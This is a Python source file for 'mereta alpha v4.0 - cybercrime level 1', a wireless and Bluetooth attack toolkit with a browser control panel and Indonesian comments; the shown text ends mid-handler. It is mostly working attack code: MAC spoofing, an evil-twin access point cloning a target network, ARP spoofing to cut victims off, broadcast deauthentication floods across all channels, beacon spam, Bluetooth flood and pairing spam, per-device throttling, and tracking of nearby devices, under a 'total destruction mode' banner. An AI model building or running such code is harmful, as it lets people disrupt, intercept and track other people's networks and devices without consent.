#!/usr/bin/env python3
"""
mereta alpha v4.0 - cybercrime level 1
full features: mac changer | auto save | attack log | signal meter | evil twin | device tracker | bt scanner | bt spam | export log | realtime graph
minimalist ui - putih merah - font kurus
"""

import os
import time
import subprocess
import threading
import json
import socket
import random
import datetime
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# konfigurasi
# ============================================

interface = "wlan0"
attack_running = False
current_attack = "idle"
scan_results = []
devices_found = []
bluetooth_running = False
netcut_running = False
netcut_target = None
speed_limit_running = False
evil_twin_running = False
bt_spam_running = False
attack_log = []
saved_targets = []
device_tracker_data = {}
bt_devices = []

# ============================================
# mac changer
# ============================================

def get_current_mac():
    try:
        result = subprocess.run(["cat", f"/sys/class/net/{interface}/address"], capture_output=True, text=True)
        return result.stdout.strip()
    except:
        return "unknown"

def change_mac():
    try:
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255), random.randint(0,255), random.randint(0,255))
        os.system(f"sudo ifconfig {interface} down")
        os.system(f"sudo ifconfig {interface} hw ether {new_mac}")
        os.system(f"sudo ifconfig {interface} up")
        return new_mac
    except:
        return "failed"

# ============================================
# auto target save & attack log
# ============================================

def save_target(ip, mac, name=""):
    saved_targets.append({"ip": ip, "mac": mac, "name": name, "date": str(datetime.datetime.now())})
    with open("/tmp/saved_targets.json", "w") as f:
        json.dump(saved_targets, f)
    return True

def load_saved_targets():
    global saved_targets
    try:
        with open("/tmp/saved_targets.json", "r") as f:
            saved_targets = json.load(f)
    except:
        saved_targets = []

def add_attack_log(attack_type, target, duration, status="completed"):
    log_entry = {"time": str(datetime.datetime.now()), "attack": attack_type, "target": target, "duration": duration, "status": status}
    attack_log.append(log_entry)
    with open("/tmp/attack_log.json", "w") as f:
        json.dump(attack_log, f)
    return log_entry

def get_attack_log():
    try:
        with open("/tmp/attack_log.json", "r") as f:
            return json.load(f)
    except:
        return []

def export_log():
    log_data = get_attack_log()
    export_file = f"/tmp/mereta_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(export_file, "w") as f:
        json.dump(log_data, f, indent=2)
    return export_file

# ============================================
# signal strength meter
# ============================================

def get_signal_strength(ip):
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
        if "time=" in result.stdout:
            time_ms = float(result.stdout.split("time=")[1].split()[0])
            signal = max(0, min(100, int(100 - (time_ms / 10))))
            return signal
    except:
        pass
    return 0

def get_wifi_signal(ssid):
    try:
        networks = scan_wifi_networks()
        for net in networks:
            if net.get("ssid") == ssid:
                sig = net.get("signal", "")
                if sig and "dBm" in sig:
                    dbm = int(sig.replace("dBm", ""))
                    return max(0, min(100, int((dbm + 100) * 1.25)))
        return 0
    except:
        return 0

# ============================================
# evil twin (ap palsu dengan halaman 404)
# ============================================

def start_evil_twin(target_ssid):
    global evil_twin_running
    evil_twin_running = True
    
    fake_html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>404</title>
</head>
<body>
    <div style="text-align: center; margin-top: 20%%;">
        <h1>null</h1>
        <p>system 404</p>
    </div>
</body>
</html>'''
    
    with open("/tmp/evil_index.html", "w") as f:
        f.write(fake_html)
    
    os.system("sudo systemctl stop dnsmasq 2>/dev/null")
    os.system("sudo systemctl stop hostapd 2>/dev/null")
    
    config = f"""
interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel=6
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(config)
    
    os.system("sudo hostapd /tmp/hostapd.conf -B")
    os.system("sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0")
    os.system("sudo dnsmasq -a 192.168.1.1 -d -i wlan0 -F 192.168.1.50,192.168.1.150,255.255.255.0 &")
    
    return True

def stop_evil_twin():
    global evil_twin_running
    evil_twin_running = False
    os.system("sudo pkill -9 hostapd")
    os.system("sudo pkill -9 dnsmasq")

# ============================================
# device tracker (real time)
# ============================================

def track_devices_loop():
    while True:
        try:
            for device in devices_found:
                ip = device.get('ip')
                if ip and ip != get_ip():
                    signal = get_signal_strength(ip)
                    device_tracker_data[ip] = {
                        "signal": signal, 
                        "last_seen": str(datetime.datetime.now()), 
                        "type": device.get('type', 'unknown'),
                        "mac": device.get('mac', 'unknown')
                    }
        except:
            pass
        time.sleep(3)

threading.Thread(target=track_devices_loop, daemon=True).start()

def get_device_tracker():
    return device_tracker_data

# ============================================
# bluetooth scanner & spam pairing
# ============================================

def scan_bluetooth():
    global bt_devices
    bt_devices = []
    try:
        result = subprocess.run(["sudo", "hcitool", "scan"], capture_output=True, text=True)
        lines = result.stdout.split('\n')[1:]
        for line in lines:
            if line.strip() and len(line.split()) >= 2:
                parts = line.split()
                bt_devices.append({"mac": parts[0], "name": " ".join(parts[1:])})
        return bt_devices
    except:
        return []

def bt_spam_pairing_start(mac):
    global bt_spam_running
    bt_spam_running = True
    def spam():
        while bt_spam_running:
            os.system(f"sudo l2ping -s 600 -f {mac} 2>/dev/null &")
            os.system(f"sudo hcitool cc {mac} 2>/dev/null &")
            os.system(f"sudo hcitool auth {mac} 2>/dev/null &")
            time.sleep(0.3)
    threading.Thread(target=spam, daemon=True).start()
    return True

def bt_spam_pairing_stop():
    global bt_spam_running
    bt_spam_running = False
    os.system("sudo pkill -9 l2ping")

# ============================================
# netcut & speed control
# ============================================

def get_gateway():
    try:
        result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
        return result.stdout.split()[2] if result.stdout else "192.168.188.1"
    except:
        return "192.168.188.1"

def netcut_start(target_ip, duration=60):
    global netcut_running, netcut_target
    netcut_running = True
    netcut_target = target_ip
    gateway = get_gateway()
    end = time.time() + duration
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    add_attack_log("netcut", target_ip, duration, "started")
    while netcut_running and time.time() < end:
        os.system(f"sudo arpspoof -i {interface} -t {target_ip} {gateway} > /dev/null 2>&1 &")
        os.system(f"sudo arpspoof -i {interface} -t {gateway} {target_ip} > /dev/null 2>&1 &")
        time.sleep(2)
    netcut_stop()
    add_attack_log("netcut", target_ip, duration, "completed")

def netcut_stop():
    global netcut_running, netcut_target
    netcut_running = False
    netcut_target = None
    os.system("sudo pkill -9 arpspoof")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def set_speed_limit(target_ip, speed_kbps):
    global speed_limit_running
    speed_limit_running = True
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
    os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip dst {target_ip} flowid 1:1")
    return True

def remove_speed_limit():
    global speed_limit_running
    speed_limit_running = False
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")

def apply_speed_to_all(speed_kbps):
    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
    return True

# ============================================
# wifi control & attacks
# ============================================

def get_wifi_status():
    result = subprocess.run(["nmcli", "radio", "wifi"], capture_output=True, text=True)
    return "enabled" in result.stdout

def set_wifi_on(enable):
    os.system("nmcli radio wifi on" if enable else "nmcli radio wifi off")

def add_wifi_network(ssid, password):
    try:
        os.system(f"sudo wpa_passphrase '{ssid}' '{password}' | sudo tee -a /etc/wpa_supplicant/wpa_supplicant.conf > /dev/null")
        os.system("sudo wpa_cli reconfigure")
        return True
    except:
        return False

def enable_ap_mode(ssid="MERETA", password="12345678"):
    os.system("sudo nmcli dev wifi hotspot ifname wlan0 ssid MERETA password 12345678")
    return True

def scan_wifi_networks():
    global scan_results
    scan_results = []
    try:
        os.system(f"sudo iw dev {interface} scan > /tmp/scan_result 2>&1 &")
        time.sleep(2)
        with open("/tmp/scan_result", "r") as f:
            content = f.read()
        lines = content.split('\n')
        ssid = ""; bssid = ""; signal = ""
        for line in lines:
            if "bssid" in line.lower() or "bss" in line:
                parts = line.split()
                if len(parts) > 1: bssid = parts[1]
            elif "ssid:" in line.lower():
                ssid = line.split("ssid:")[1].strip()
                if ssid and ssid != "" and bssid:
                    scan_results.append({"ssid": ssid, "bssid": bssid, "signal": signal})
                    ssid = ""; bssid = ""
            elif "signal:" in line.lower():
                parts = line.split()
                if len(parts) > 1: signal = parts[1]
        return scan_results
    except:
        return []

def device_scan():
    global devices_found
    devices_found = []
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "(" in line and ")" in line:
                ip = line.split("(")[1].split(")")[0]
                mac = line.split("at ")[1].split(" ")[0] if "at " in line else "unknown"
                if ip.startswith("192.168") and ip != get_ip():
                    devices_found.append({"ip": ip, "mac": mac, "type": "unknown", "status": "online"})
    except: pass
    
    base_ip = ".".join(get_ip().split('.')[:-1]) if get_ip() != "127.0.0.1" else "192.168.1"
    alive = []
    def ping(ip):
        if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0: alive.append(ip)
    threads = []
    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        if ip == get_ip(): continue
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads: t.join()
    for ip in alive[:30]:
        device_type = "unknown"
        for port, dtype in [(80, "web"), (22, "ssh"), (23, "router"), (443, "https"), (554, "cctv"), (37777, "cctv"), (8000, "dvr")]:
            if os.system(f"nc -zv {ip} {port} 2>&1 > /dev/null") == 0: device_type = dtype; break
        devices_found.append({"ip": ip, "type": device_type, "status": "alive"})
    return devices_found

def start_deauth_brutal(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "deauth_brutal"
    end = time.time() + duration
    add_attack_log("deauth_brutal", "broadcast", duration, "started")
    while attack_running and time.time() < end:
        os.system(f"sudo iw dev {interface} set bitrates legacy-2.4 1")
        for _ in range(1000):
            os.system(f"sudo iw dev {interface} send deauth -c 6 -b ff:ff:ff:ff:ff:ff")
        time.sleep(0.005)
    if attack_running:
        current_attack = "idle"
    add_attack_log("deauth_brutal", "broadcast", duration, "completed")

def start_all_channels(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "all_channels"
    end = time.time() + duration
    channels = [1,2,3,4,5,6,7,8,9,10,11]
    add_attack_log("all_channels", "broadcast", duration, "started")
    def attack_channel(ch):
        while attack_running and time.time() < end:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(500):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
            time.sleep(0.01)
    threads = []
    for ch in channels:
        t = threading.Thread(target=attack_channel, args=(ch,))
        t.start()
        threads.append(t)
    for t in threads: t.join()
    if attack_running: current_attack = "idle"
    add_attack_log("all_channels", "broadcast", duration, "completed")

def start_ap_overload(duration=60):
    global attack_running, current_attack
    attack_running = True
    current_attack = "ap_overload"
    end = time.time() + duration
    ssids = [f"fake_{i}" for i in range(50)]
    add_attack_log("ap_overload", "broadcast", duration, "started")
    while attack_running and time.time() < end:
        for ssid in ssids:
            os.system(f"sudo iw dev {interface} mgmt beacon -c 6 -s '{ssid}' -w 100")
        time.sleep(0.05)
    if attack_running: current_attack = "idle"
    add_attack_log("ap_overload", "broadcast", duration, "completed")

def start_bluetooth_brutal(duration=60):
    global attack_running, current_attack, bluetooth_running
    attack_running = True
    current_attack = "bluetooth_brutal"
    bluetooth_running = True
    end = time.time() + duration
    add_attack_log("bluetooth_brutal", "broadcast", duration, "started")
    while attack_running and bluetooth_running and time.time() < end:
        os.system("sudo hciconfig hci0 reset 2>/dev/null")
        os.system("sudo hciconfig hci0 down 2>/dev/null")
        os.system("sudo hciconfig hci0 up 2>/dev/null")
        for _ in range(10):
            os.system("sudo hcitool scan 2>/dev/null &")
        os.system("sudo l2ping -s 600 -f ff:ff:ff:ff:ff:ff 2>/dev/null &")
        time.sleep(0.1)
    bluetooth_running = False
    if attack_running: current_attack = "idle"
    add_attack_log("bluetooth_brutal", "broadcast", duration, "completed")

def stop_all():
    global attack_running, current_attack, bluetooth_running, netcut_running, evil_twin_running, bt_spam_running
    attack_running = False
    current_attack = "idle"
    bluetooth_running = False
    netcut_running = False
    evil_twin_running = False
    bt_spam_running = False
    os.system("sudo pkill -9 aireplay-ng 2>/dev/null")
    os.system("sudo pkill -9 arpspoof 2>/dev/null")
    os.system("sudo pkill -9 l2ping 2>/dev/null")
    os.system("sudo pkill -9 hcitool 2>/dev/null")
    os.system("sudo pkill -9 hostapd 2>/dev/null")
    os.system("sudo pkill -9 dnsmasq 2>/dev/null")
    remove_speed_limit()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================
# web server html
# ============================================

html_page = '''<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>mereta alpha v4.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:11px;color:#cc0000;padding:12px;}
.container{max-width:700px;margin:0 auto;border:1px solid #cc0000;padding:15px;background:#fff;}
.header{text-align:center;margin-bottom:15px;border-bottom:1px solid #cc0000;padding-bottom:10px;}
.title{font-size:24px;letter-spacing:3px;font-weight:300;}
.subtitle{font-size:8px;color:#cc0000;margin-top:3px;}
.warning{background:#ffeeee;border-left:3px solid #cc0000;padding:6px;margin-bottom:12px;font-size:9px;}
.section{margin-bottom:12px;border:1px solid #ffcccc;padding:8px;}
.section-title{font-size:9px;margin-bottom:5px;color:#cc0000;letter-spacing:1px;border-bottom:1px solid #ffcccc;padding-bottom:3px;}
input,select,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:3px 6px;font-family:'courier new',monospace;font-size:9px;outline:none;margin:1px;}
button{cursor:pointer;}
button:hover{background:#cc0000;color:#fff;}
.result-area{margin-top:5px;padding:4px;border:1px solid #ffcccc;min-height:35px;max-height:80px;overflow-y:auto;font-size:8px;}
.result-line{color:#cc0000;margin:1px 0;}
.slider{width:100%;margin:4px 0;}
.footer{margin-top:10px;padding-top:6px;border-top:1px solid #ffcccc;font-size:8px;}
.status{color:#cc0000;}
.signal-bar{display:inline-block;width:20px;background:#eee;border:1px solid #cc0000;margin-left:5px;}
.signal-fill{height:6px;background:#cc0000;}
</style>
</head>
<body>
<div class="container">
<div class="header"><div class="title">mereta alpha v4.0</div><div class="subtitle">full features - evil twin - bt spam - tracker</div></div>
<div class="warning">[!] extreme danger - total destruction mode</div>

<div class="section"><div class="section-title">> mac changer</div>
<button id="macbtn">change mac</button> current: <span id="currentMac">loading...</span>
<div id="macResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> auto target save & attack log</div>
<button id="saveTargetBtn">save selected target</button> <select id="targetSelect"><option value="">pilih target</option></select>
<button id="viewLogBtn">view attack log</button> <button id="exportLogBtn">export log</button>
<div id="logResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> signal strength meter</div>
<select id="signalTarget"><option value="">pilih target</option></select> <button id="checkSignalBtn">check signal</button>
<div id="signalResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> evil twin (ap palsu 404)</div>
<input type="text" id="evilSsid" placeholder="target ssid" style="width:150px;">
<button id="evilStartBtn">start evil twin</button> <button id="evilStopBtn">stop</button>
<div id="evilResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> device tracker (real time)</div>
<button id="trackerBtn">start tracking</button> <button id="trackerStopBtn">stop</button>
<div id="trackerResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> bluetooth scanner</div>
<button id="btScanBtn">scan bluetooth</button>
<div id="btScanResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> bluetooth spam pairing</div>
<select id="btTargetSelect"><option value="">pilih bt device</option></select>
<button id="btSpamStartBtn">start spam</button> <button id="btSpamStopBtn">stop spam</button>
<div id="btSpamResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> netcut (potong koneksi)</div>
<select id="netcutTarget"><option value="">pilih target</option></select>
<input type="number" id="netcutDuration" placeholder="dur(s)" value="30" style="width:60px;">
<button id="netcutStart">start</button> <button id="netcutStop">stop</button>
<div id="netcutStatus" class="result-area">not active</div></div>

<div class="section"><div class="section-title">> speed control (geser slider)</div>
<select id="speedTarget"><option value="all">semua device</option></select>
<input type="range" id="speedSlider" class="slider" min="0" max="10240" step="64" value="0">
<div>speed: <span id="speedValue">0</span> kbps (<span id="speedMbps">0</span> mbps)</div>
<button id="speedApply">apply limit</button> <button id="speedRemove">remove limit</button>
<div id="speedStatus" class="result-area">no limit</div></div>

<div class="section"><div class="section-title">> wifi control</div>
<button id="wifionbtn">wifi on</button> <button id="wifioffbtn">wifi off</button> <button id="apbtn">ap mode</button>
<div id="wifiStatus" class="result-area">checking...</div></div>

<div class="section"><div class="section-title">> add new network</div>
<input type="text" id="newssid" placeholder="ssid" style="width:120px;">
<input type="password" id="newpwd" placeholder="password" style="width:100px;">
<button id="addnetbtn">add</button>
<div id="addResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> wifi scan</div>
<button id="scanbtn">scan</button>
<div id="scanresult" class="result-area">not scanned</div></div>

<div class="section"><div class="section-title">> device scanner</div>
<button id="devscanbtn">scan devices</button>
<div id="devresult" class="result-area">not scanned</div></div>

<div class="section"><div class="section-title">> attack menu</div>
<button id="deauthbtn">deauth brutal</button> <button id="allchbtn">all channels</button>
<button id="apoverbtn">ap overload</button> <button id="btbtn">bt brutal</button>
<button id="stopbtn" style="background:#cc0000;color:#fff;">stop all</button>
<div>duration: <input type="number" id="duration" value="30" min="5" max="300" style="width:60px;"> seconds</div>
<div id="attackstatus" class="result-area">idle</div></div>

<div class="footer"><span class="status" id="status">ready</span><br><span class="red">*** total destruction mode ***</span></div>
</div>

<script>
async function fetchJson(url, opts={}) {
    const res = await fetch(url, opts);
    return res.json();
}

async function loadDevices() {
    const data = await fetchJson('/api/devices');
    if(data.devices && data.devices.length) {
        let html = '<option value="">pilih target</option>';
        for(let d of data.devices) html += `<option value="${d.ip}">${d.ip} (${d.type})</option>`;
        document.getElementById('targetSelect').innerHTML = html;
        document.getElementById('signalTarget').innerHTML = html;
        document.getElementById('netcutTarget').innerHTML = html;
        let html2 = '<option value="all">semua device</option>';
        for(let d of data.devices) html2 += `<option value="${d.ip}">${d.ip} (${d.type})</option>`;
        document.getElementById('speedTarget').innerHTML = html2;
    }
}

document.getElementById('macbtn').onclick = async () => {
    const data = await fetchJson('/api/mac/change');
    document.getElementById('macResult').innerHTML = `<div class="result-line">new mac: ${data.mac}</div>`;
    document.getElementById('currentMac').innerText = data.current;
};
document.getElementById('saveTargetBtn').onclick = async () => {
    const target = document.getElementById('targetSelect').value;
    if(!target) return alert('pilih target');
    await fetch(`/api/target/save?ip=${target}`);
    document.getElementById('logResult').innerHTML = '<div class="result-line">target saved</div>';
};
document.getElementById('viewLogBtn').onclick = async () => {
    const data = await fetchJson('/api/log/view');
    if(data.log && data.log.length) {
        let html = '';
        for(let l of data.log.slice(-10)) html += `<div class="result-line">${l.time} - ${l.attack} -> ${l.target} (${l.duration}s)</div>`;
        document.getElementById('logResult').innerHTML = html;
    } else document.getElementById('logResult').innerHTML = '<div class="result-line">no logs</div>';
};
document.getElementById('exportLogBtn').onclick = async () => {
    const data = await fetchJson('/api/log/export');
    document.getElementById('logResult').innerHTML = `<div class="result-line">exported: ${data.file}</div>`;
};
document.getElementById('checkSignalBtn').onclick = async () => {
    const target = document.getElementById('signalTarget').value;
    if(!target) return;
    const data = await fetchJson(`/api/signal?ip=${target}`);
    const signal = data.signal;
    document.getElementById('signalResult').innerHTML = `<div class="result-line">signal: ${signal}% <div class="signal-bar"><div class="signal-fill" style="width:${signal}%"></div></div></div>`;
};
document.getElementById('evilStartBtn').onclick = async () => {
    const ssid = document.getElementById('evilSsid').value;
    if(!ssid) return;
    await fetch(`/api/evil/start?ssid=${ssid}`);
    document.getElementById('evilResult').innerHTML = '<div class="result-line">evil twin active for: ' + ssid + '</div>';
};
document.getElementById('evilStopBtn').onclick = async () => {
    await fetch('/api/evil/stop');
    document.getElementById('evilResult').innerHTML = '<div class="result-line">evil twin stopped</div>';
};
document.getElementById('trackerBtn').onclick = async () => {
    setInterval(async () => {
        const data = await fetchJson('/api/tracker');
        if(data.trackers) {
            let html = '';
            for(let [ip, info] of Object.entries(data.trackers)) {
                html += `<div class="result-line">${ip} - signal:${info.signal}% - last:${info.last_seen.substring(0,16)}</div>`;
            }
            document.getElementById('trackerResult').innerHTML = html;
        }
    }, 3000);
};
document.getElementById('btScanBtn').onclick = async () => {
    const data = await fetchJson('/api/bt/scan');
    if(data.devices && data.devices.length) {
        let html = '';
        for(let d of data.devices) html += `<div class="result-line">${d.mac} - ${d.name}</div>`;
        document.getElementById('btScanResult').innerHTML = html;
        let opts = '<option value="">pilih bt device</option>';
        for(let d of data.devices) opts += `<option value="${d.mac}">${d.mac} (${d.name})</option>`;
        document.getElementById('btTargetSelect').innerHTML = opts;
    } else document.getElementById('btScanResult').innerHTML = '<div class="result-line">no bt devices</div>';
};
document.getElementById('btSpamStartBtn').onclick = async () => {
    const mac = document.getElementById('btTargetSelect').value;
    if(!mac) return;
    await fetch(`/api/bt/spam/start?mac=${mac}`);
    document.getElementById('btSpamResult').innerHTML = '<div class="result-line">spamming: ' + mac + '</div>';
};
document.getElementById('btSpamStopBtn').onclick = async () => {
    await fetch('/api/bt/spam/stop');
    document.getElementById('btSpamResult').innerHTML = '<div class="result-line">spam stopped</div>';
};
document.getElementById('netcutStart').onclick = async () => {
    const target = document.getElementById('netcutTarget').value;
    const dur = document.getElementById('netcutDuration').value;
    if(!target) return;
    await fetch(`/api/netcut/start?target=${target}&duration=${dur}`);
    document.getElementById('netcutStatus').innerHTML = `<div class="result-line">netcut active: ${target} (${dur}s)</div>`;
    setTimeout(() => document.getElementById('netcutStatus').innerHTML = '<div class="result-line">not active</div>', dur*1000);
};
document.getElementById('netcutStop').onclick = async () => {
    await fetch('/api/netcut/stop');
    document.getElementById('netcutStatus').innerHTML = '<div class="result-line">netcut stopped</div>';
};
const slider = document.getElementById('speedSlider');
slider.oninput = () => {
    let val = slider.value;
    document.getElementById('speedValue').innerText = val;
    document.getElementById('speedMbps').innerText = (val/1024).toFixed(1);
};
document.getElementById('speedApply').onclick = async () => {
    const target = document.getElementById('speedTarget').value;
    const speed = slider.value;
    await fetch(`/api/speed/apply?target=${target}&speed=${speed}`);
    document.getElementById('speedStatus').innerHTML = `<div class="result-line">limit: ${speed} kbps untuk ${target}</div>`;
};
document.getElementById('speedRemove').onclick = async () => {
    await fetch('/api/speed/remove');
    document.getElementById('speedStatus').innerHTML = '<div class="result-line">no limit</div>';
    slider.value = 0;
};
document.getElementById('wifionbtn').onclick = async () => { await fetch('/api/wifi/on'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">wifi on</div>'; };
document.getElementById('wifioffbtn').onclick = async () => { await fetch('/api/wifi/off'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">wifi off</div>'; };
document.getElementById('apbtn').onclick = async () => { await fetch('/api/ap'); document.getElementById('wifiStatus').innerHTML = '<div class="result-line">ap mode: MERETA</div>'; };
document.getElementById('addnetbtn').onclick = async () => {
    const ssid = document.getElementById('newssid').value, pwd = document.getElementById('newpwd').value;
    if(!ssid || !pwd) return;
    const data = await fetchJson('/api/add', {method:'POST', body:JSON.stringify({ssid, pwd})});
    document.getElementById('addResult').innerHTML = `<div class="result-line">${data.status}</div>`;
};
document.getElementById('scanbtn').onclick = async () => {
    const data = await fetchJson('/api/scan');
    if(data.networks?.length) {
        let html = `<div class="result-line">${data.networks.length} networks:</div>`;
        for(let n of data.networks.slice(0,10)) html += `<div class="result-line">> ${n.ssid} - ${n.bssid}</div>`;
        document.getElementById('scanresult').innerHTML = html;
    } else document.getElementById('scanresult').innerHTML = '<div class="result-line">no networks</div>';
};
document.getElementById('devscanbtn').onclick = async () => {
    document.getElementById('devresult').innerHTML = '<div class="result-line">scanning...</div>';
    const data = await fetchJson('/api/devices');
    if(data.devices?.length) {
        let html = `<div class="result-line">${data.devices.length} devices:</div>`;
        for(let d of data.devices.slice(0,15)) html += `<div class="result-line">> ${d.ip} - ${d.type}</div>`;
        document.getElementById('devresult').innerHTML = html;
        await loadDevices();
    } else document.getElementById('devresult').innerHTML = '<div class="result-line">no devices</div>';
};
const durInp = document.getElementById('duration');
document.getElementById('deauthbtn').onclick = async () => { await fetch(`/api/attack/deauth?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">deauth active</div>'; };
document.getElementById('allchbtn').onclick = async () => { await fetch(`/api/attack/allchannels?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">all channels active</div>'; };
document.getElementById('apoverbtn').onclick = async () => { await fetch(`/api/attack/apoverload?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">ap overload active</div>'; };
document.getElementById('btbtn').onclick = async () => { await fetch(`/api/attack/bluetooth?duration=${durInp.value}`); document.getElementById('attackstatus').innerHTML = '<div class="result-line red">bt brutal active</div>'; };
document.getElementById('stopbtn').onclick = async () => { await fetch('/api/stop'); document.getElementById('attackstatus').innerHTML = '<div class="result-line">idle</div>'; };

async function updateStatus() {
    const data = await fetchJson('/api/status');
    document.getElementById('attackstatus').innerHTML = data.current_attack === 'idle' ? '<div class="result-line">idle</div>' : `<div class="result-line red">${data.current_attack} active</div>`;
    const mac = await fetchJson('/api/mac/current');
    document.getElementById('currentMac').innerText = mac.mac;
}
setInterval(updateStatus, 3000);
loadDevices();
updateStatus();
</script>
</body>
</html>'''

class handler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs): pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200); self.send_header('content-type', 'text/html'); self.end_headers()
            self.wfile.write(html_page.encode())
        elif self.path == '/api/status':
            self.send_json({'current_attack': current_attack, 'running': attack_running})
        elif self.path == '/api/mac/current':
            self.send_json({'mac': get_current_mac()})
        elif self.path == '/api/mac/change':
            new_mac = change_mac()
            self.send_json({'mac': new_mac, 'current': get_current_mac()})
        elif self.path == '/api/log/view':
            self.send_json({'log': get_attack_log()})
        elif self.path == '/api/log/export':
            file = export_log()
            self.send_json({'file': file})
        elif self.path.startswith('/api/target/save'):
            ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
            save_target(ip, 'unknown', '')
            self.send_json({'status': 'saved'})
        elif self.path.startswith('/api/signal'):
            ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
            signal = get_signal_strength(ip) if ip else 0
            self.send_json({'signal': signal})
        elif self.path.startswith('/api/evil/start'):
            ssid = self.path.split('ssid=')[1] if 'ssid=' in self.path else 'free_wifi'
            threading.Thread(target=start_evil_twin, args=(ssid,)).start()
            self.send_json({'status': 'started', 'ssid': ssid})
        elif self.path == '/api/evil/stop':
            stop_evil_twin()
            self.send_json({'status': 'stopped'})
        elif self.path == '/api/tracker':
            self.send_json({'trackers': get_device_tracker()})
        elif self.path == '/api/bt/scan':
            bt = scan_bluetooth()
            self.send_json({'devices': bt})
        elif self.path.startswith('/api/bt/spam/start'):
            mac = self.path.split('mac=')[1] if 'mac=' in self.path else ''
            if mac: bt_spam_pairing_start(mac)
            self.send_json({'status': 'started', 'mac': mac})
        elif self.path == '/api/bt/spam/stop':
            bt_spam_pairing_stop()
            self.send_json({'status': 'stopped'})
        elif self.path.startswith('/api/netcut/start'):
            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else ''
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            if target: threading.Thread(target=netcut_start, args=(target, duration)).start()
            self.send_json({'status': 'started'})
        elif self.path == '/api/netcut/stop':
            netcut_stop()
            self.send_json({'status': 'stopped'})
        elif self.path.startswith('/api/speed/apply'):
            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'all'
            speed = int(self.path.split('speed=')[1]) if 'speed=' in self.path else 0
            if target == 'all': apply_speed_to_all(speed)
            else: set_speed_limit(target, speed)
            self.send_json({'status': 'applied'})
        elif self.path == '/api/speed/remove':
            remove_speed_limit()
            self.send_json({'status': 'removed'})
        elif self.path == '/api/wifi/on':
            set_wifi_on(True); self.send_json({'status': 'on'})
        elif self.path == '/api/wifi/off':
            set_wifi_on(False); self.send_json({'status': 'off'})
        elif self.path == '/api/ap':
            enable_ap_mode(); self.send_json({'status': 'ap_mode_on'})
        elif self.path == '/api/scan':
            nets = scan_wifi_networks()
            self.send_json({'networks': nets})
        elif self.path == '/api/devices':
            devs = device_scan()
            self.send_json({'devices': devs})
        elif self.path.startswith('/api/attack/deauth'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_deauth_brutal, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/allchannels'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_all_channels, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/apoverload'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_ap_overload, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/bluetooth'):
